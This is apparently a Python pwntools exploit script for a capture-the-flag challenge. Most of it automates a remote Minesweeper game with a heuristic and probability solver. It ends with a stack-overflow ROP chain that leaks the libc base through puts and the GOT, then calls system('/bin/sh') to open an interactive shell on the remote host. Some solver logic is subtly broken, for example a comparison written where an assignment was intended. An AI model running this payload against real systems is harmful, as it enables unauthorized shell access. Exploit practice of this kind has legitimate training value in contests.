#!/usr/bin/env python
import sys, os, random
from pwn import *
from decimal import Decimal

log.warning('Usage: ./exp.py [HOST] [PORT]')
prog = os.path.dirname(os.path.abspath(__file__)).split('/')[-1]
elf = ELF(prog)
if not elf: log.warning('Cannot open ' + prog)
libc = ELF('libc.so.6') if len(sys.argv) > 2 else elf.libc
if not libc: log.warning('Cannot open libc.so.6')
HOST, PORT = (sys.argv[1], sys.argv[2]) if len(sys.argv) > 2 else ('localhost', 5566)
context.word_size = 64 if '64' in elf.arch else 32 # amd64, aarch64, powerpc64, mips64

# 0=blank=B, -1=unknown='-', -2=bomb='*', 9=non-bomb
X = 16 - 1
Y = 16 - 1

def debug(board):
    print '        |0||1||2||3||4||5||6||7||8||9||a||b||c||d||e||f|\n'
    for j, row in enumerate(board):
        out = '|{}|'.format(j).ljust(8, ' ')
        for i, s in enumerate(row):
            c = s if s != -1 else '-'
            c = 'G' if s == -2 else c 
            out += '|{}|'.format(c)
        print out

def heuristic(x, y, board):
    def num(x, y):
        return board[y][x]
    def unknown(x, y, t=-1):
        u = set()
        for j in range(y-1, y+1+1):
            for i in range(x-1, x+1+1):
                if i < 0 or j < 0 or i > X or j > Y:
                    continue
                elif i == x and j == y:
                    continue
                elif board[j][i] == t:
                    u.add((i, j))
        return u 
    def mine(x, y):
        return unknown(x, y, -2)
    def unknowns(c1, c2):
        def near(x, y):
            n = set()
            for j in range(y-1, y+1+1):
                for i in range(x-1, x+1+1):
                    if i < 0 or j < 0 or i > X or j > Y:
                        continue
                    elif i == x and j == y:
                        continue
                    n.add((i, j))
            return n
        n1 = near(c1[0], c1[1])
        n2 = near(c2[0], c2[1])
        u = set()
        for c in n1 & n2:
            if board[c[1]][c[0]] == -1:
                u.add((c[0], c[1]))
        return u 

    u = unknown(x, y)
    # situation 1
    if num(x, y) - len(mine(x, y)) == len(u):
        for c in u: board[c[1]][c[0]] = -2
    # situation 3
    for j in range(y-2, y+2+1):
        for i in range(x-2, x+2+1):
            if i < 0 or j < 0 or i > X or j > Y:
                continue
            elif i == x and j == y:
                continue
            us = unknowns((x, y), (i, j))
            if len(u) - len(us) == num(x, y) - num(i, j):
                for c in u - us: board[c[1]][c[0]] == -2
    # situation 2
    if num(x, y) != 0 and num(x, y) == len(mine(x, y)):
        for c in u:
            if board[c[1]][c[0]] == -1:
                board[c[1]][c[0]] = 9

    return board

def cal_p(x, y, p, board):
    def unknown(x, y, t=-1):
        u = set()
        for j in range(y-1, y+1+1):
            for i in range(x-1, x+1+1):
                if i < 0 or j < 0 or i > X or j > Y:
                    continue
                elif i == x and j == y:
                    continue
                elif board[j][i] == t:
                    u.add((i, j))
        return u 

    for j in range(y-1, y+1+1):
        for i in range(x-1, x+1+1):
            if i < 0 or j < 0 or i > X or j > Y:
                continue
            elif i == x and j == y:
                continue

            if board[j][i] == -1:
                p[j][i] = Decimal(board[y][x]) / Decimal(len(unknown(x, y)))
    return p

def play(r):
    def recv_board():
        r.recvline(); r.recvline()
        result = ''
        notlose = True
        for j in range(Y+1):
            row = r.recvline().strip()
            row = row.replace('\x00', 'B')
            row = row.replace('\x01', '1')
            row = row.replace('\x02', '2')
            row = row.replace('\x03', '3')
            row = row.replace('\x04', '4')
            row = row.replace('\x05', '5')
            row = row.replace('\x06', '6')
            row = row.replace('\x07', '7')
            row = row.replace('\x08', '8')
            result += row + '\n'
            row = row.split('\t')[1:]
            for i, cell in enumerate(row):
                if '-' in cell:
                    pass
                elif 'B' in cell:
                    board[j][i] = 0
                elif '*' in cell:
                    notlose = False
                else:
                    board[j][i] = int(cell.strip('|'))
        if not notlose:
            result = result.replace('\t', '')
            print result
        return notlose

    def turn(x, y, mark=0):
        r.sendline('{} {} {}'.format(mark, x, y))
        return recv_board()

    def find_next(probability):
        mp = 1
        x = -1; y = -1
        for j, row in enumerate(probability):
            for i, p in enumerate(row):
                if p <= mp:
                    mp = p
                    x = i; y = j
        return x, y 

    def find_bomb():
        for j, row in enumerate(board):
            for i, c in enumerate(row):
                if board[j][i] == -2:
                    return i, j
        return None 
                

    board = [[-1 for i in range(16)] for i in range(Y+1)]
    probability = [[ Decimal(99) / Decimal(16*(Y+1)) for i in range(16)] for i in range(Y+1)]
    recv_board()

    # send last record
    for j, row in enumerate(g_board):
        for i, s in enumerate(row):
           if s >= 0: turn(i, j) 

    # play
    x = 2; y = 2
    while True:
        if not turn(x, y):
            log.failure('lose. QQ')
            return False

        # do heuristic
        for j, row in enumerate(g_board):
            for i, s in enumerate(row):
                if board[j][i] == -1:
                    continue
                while True:
                    tmp = heuristic(i, j, board)
                    if tmp == board: break
                    board = tmp
        debug(board)

        # calculate probability
        for k in range(-2, 9)[::-1]:
            for j, row in enumerate(g_board):
                for i, s in enumerate(row):
                    if board[j][i] == -1:
                        continue
                    elif board[j][i] == 9:
                        probability[j][i] = 0 
                        continue
                    elif board[j][i] == -2:
                        probability[j][i] = 1 
                        continue
                    elif board[j][i] != k:
                        continue
                    probability[j][i] = 1 
                    probability = cal_p(i, j, probability, board)

        if find_bomb():
            x, y = find_bomb()
            progress = log.progress('bomb at ({}, {})'.format(x, y))
            for i in range(50):
                progress.status(str(i))
                turn(x, y, 1)
            progress.success('win!')
            return
        x, y = find_next(probability)

g_board = [[-1 for i in range(16)] for i in range(Y+1)]
r = remote(HOST, PORT)
play(r)

pop_rdi = 0x401f33
win = 0x401d96

# leak libc_base 
exp = flat('a'*0x78, pop_rdi, elf.got['__libc_start_main'], elf.symbols['puts'], win)
r.sendline(exp)
r.recvuntil('gg!\n')
libc_base = u64(r.recvline()[:-1].ljust(8, '\x00')) - libc.symbols['__libc_start_main']
libc.address += libc_base
log.info('libc_base: ' + hex(libc_base))

# shell out
exp = flat('a'*0x79, pop_rdi, libc.search('/bin/sh').next(), libc.symbols['system'], elf.symbols['exit'])
r.sendline(exp)
r.recvuntil('gg!\n')

r.interactive()
